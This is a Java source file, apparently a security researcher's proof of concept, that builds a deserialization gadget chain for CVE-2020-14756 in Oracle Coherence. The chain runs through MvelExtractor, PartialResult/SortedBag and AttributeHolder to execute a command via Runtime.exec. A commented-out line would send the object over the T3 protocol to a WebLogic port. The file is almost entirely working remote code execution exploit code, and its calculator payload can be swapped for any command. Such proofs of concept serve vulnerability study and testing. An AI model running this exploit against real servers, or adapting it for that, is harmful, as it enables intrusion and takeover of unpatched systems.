package probes;

// coherence-rest.jar
import burp.Utilities;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
// coherence-web.jar
import com.tangosol.coherence.servlet.AttributeHolder;
// coherence.jar
import com.tangosol.util.SortedBag;
import com.tangosol.util.aggregator.TopNAggregator.PartialResult;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

/*
    AttributeHolder.readExternal()
        ExternalizableHelper.readObject()
            ExternalizableHelper.readObjectInternal()
                ExternalizableHelper.readExternalizableLite()
                    PartialResult.readExternal()
                        PartialResult.add()
                            SortedBag.add()
                                ...
                                    AbstractExtractor.compare()
                                        MvelExtractor.extract()
 */
public class CVE_2020_14756 {
    public static void main(String[] args) {
        MvelExtractor extractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\")");

        try {
            SortedBag sortedBag = new PartialResult();
            Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(sortedBag, extractor);
            // m_cMaxSize > SortedBag.size() (version 12.2.1.3)
            Field m_cMaxSize = sortedBag.getClass().getDeclaredField("m_cMaxSize");
            m_cMaxSize.setAccessible(true);
            m_cMaxSize.set(sortedBag, 1);
            sortedBag.add(1);  // 避免 EOFException

            AttributeHolder attributeHolder = new AttributeHolder();
            Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
            setInternalValue.setAccessible(true);
            setInternalValue.invoke(attributeHolder, sortedBag);

//            T3Protocol.send("127.0.0.1", 7001, "http", Utilities.serialize(attributeHolder));
            Utilities.deserialize(Utilities.serialize(attributeHolder));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
